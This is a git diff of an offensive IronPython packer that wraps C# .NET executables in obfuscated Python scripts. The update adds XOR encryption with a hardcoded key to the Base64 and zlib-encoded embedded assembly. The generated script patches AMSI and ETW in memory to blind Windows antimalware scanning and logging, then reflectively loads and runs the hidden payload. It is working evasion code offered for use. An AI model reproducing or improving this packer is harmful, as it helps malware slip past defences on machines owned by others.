@@ -6,9 +6,9 @@
 # Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
 # =================================================================================================================================================================
 # Features: 
-# > AMSI bypass, ETW bypass, Zlib compression and Base64 encoding, obfuscation, reflective C# code loading.
+# > AMSI bypass, ETW bypass, XOR encryption, Zlib compression and Base64 encoding, obfuscation, reflective C# code loading.
 # =================================================================================================================================================================
-# Usage:
+# Usage (examples):
 # Command to pack offensive (C#) .NET executable files into obfuscated Python scripts:
 # + C:\path-to-IronPython3\Net462> ipy.exe Invoke-Python-SharpPacker.py "C:\path-to-folder-containing-C#-exe-to-pack"
 # Commands to execute the obfuscated Python scripts:
@@ -23,6 +23,7 @@ import argparse
 import os
 import base64
 import zlib
+from itertools import cycle
 
 template_2 = """
 exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('<replace_base64_script>')[0]))
@@ -36,6 +37,7 @@ import clr
 import ctypes
 from ctypes import wintypes
 from ctypes import *
+from itertools import cycle
 import System
 from System import Array, IntPtr, UInt32
 from System.Reflection import Assembly
@@ -45,7 +47,8 @@ clr.AddReference('System.Management.Automation')
 from System.Management.Automation import Runspaces, RunspaceInvoke
 from System.Runtime.InteropServices import Marshal
 
-base64_str = '<replace_assembly>'
+
+enc_base64_str = '<enc_base64_string>'
 
 def A_M_S_I_b_y_p_a_s_s():
     windll.LoadLibrary('amsi.dll')
@@ -71,6 +74,7 @@ def A_M_S_I_b_y_p_a_s_s():
         System.UInt32(0xC3),
         ))
     Marshal.Copy(patch, 0x00, BufferAddress, 6)
+
 
 def E_T_W_b_y_p_a_s_s():
     PAGE_EXECUTE_READWRITE = 0x40
@@ -101,12 +105,31 @@ def E_T_W_b_y_p_a_s_s():
         ctypes.byref(bytes_written)
     )
 
+
 def Base64_To_Bytes(base64_string):
     compressed_data = base64.b64decode(base64_string)
     decompressed_data = zlib.decompress(compressed_data)
     return System.Array[System.Byte](decompressed_data)
 
+def _xoored(value, key):
+    return chr(ord(value) ^ ord(key))
+
+izip = zip
+
+def xoor(data, keys):
+    data_pair = izip(data, cycle(keys))
+    return ''.join(_xoored(val, key) for (val, key) in data_pair)
+
+def _decode_string(string):
+	return base64.decodebytes(string.encode()).decode()
+
+def decode(enc_data, keys):
+    data_decoded = _decode_string(enc_data)
+    return xoor(data_decoded, keys)
+
+
 def Load_And_Execute_NET_Assembly(command):
+    base64_str = decode(enc_base64_str, 'SuperKey')
     assembly_bytes = Base64_To_Bytes(base64_str)
     assembly = Assembly.Load(assembly_bytes)
     program_type = assembly.GetType('<replace_programname>.Program')
@@ -139,14 +162,13 @@ def main():
     result = Load_And_Execute_NET_Assembly(arguments.command)
     print(result)
 
-
 if __name__ == '__main__':
     main()
 """
 
 banner = """
 
-Invoke-Python-SharpPacker v.1.0
+Invoke-Python-SharpPacker v.2.0
 .------..------..------..------..------..------..------..------..------..------..------..------..------..------..------..------..------.
 |P.--. ||Y.--. ||T.--. ||H.--. ||O.--. ||N.--. ||S.--. ||H.--. ||A.--. ||R.--. ||P.--. ||P.--. ||A.--. ||C.--. ||K.--. ||E.--. ||R.--. |
 | :/\: || (\/) || :/\: || :/\: || :/\: || :(): || :/\: || :/\: || (\/) || :(): || :/\: || :/\: || (\/) || :/\: || :/\: || (\/) || :(): |
@@ -166,6 +188,22 @@ def File_To_Base64(file_path):
         simply_base64_encoded = base64.b64encode(file2.read()).decode('utf-8')
         return simply_base64_encoded
 
+def _xoored(value, key):
+    return chr(ord(value) ^ ord(key))
+    
+izip = zip
+
+def xoor(data, keys):
+    data_pair = izip(data, cycle(keys))
+    return ''.join(_xoored(val, key) for (val, key) in data_pair)
+
+def _encode_string(string):
+	return base64.encodebytes(string.encode()).decode()
+
+def encode(clear_data, keys):
+    data_xoored = xoor(clear_data, keys)
+    return _encode_string(data_xoored).replace('\n', '')
+	
 def main():
     print(banner[1:-1])
     if len(sys.argv) < 2 or sys.argv[1] == 'help':
@@ -178,9 +216,10 @@ def main():
             
             file_path1 = os.path.join(assembly_dir, file_name)
             compressed_assembly = File_To_Base64_Compressed(file_path1)
+            enc_base64_string = encode(compressed_assembly, "SuperKey")
             
             template = template_1
-            template = template.replace("<replace_assembly>", compressed_assembly)
+            template = template.replace("<enc_base64_string>", enc_base64_string)
             template = template.replace("<replace_programname>", file_name.replace('.exe', ''))
                        
             out_name = "Python-script.py"
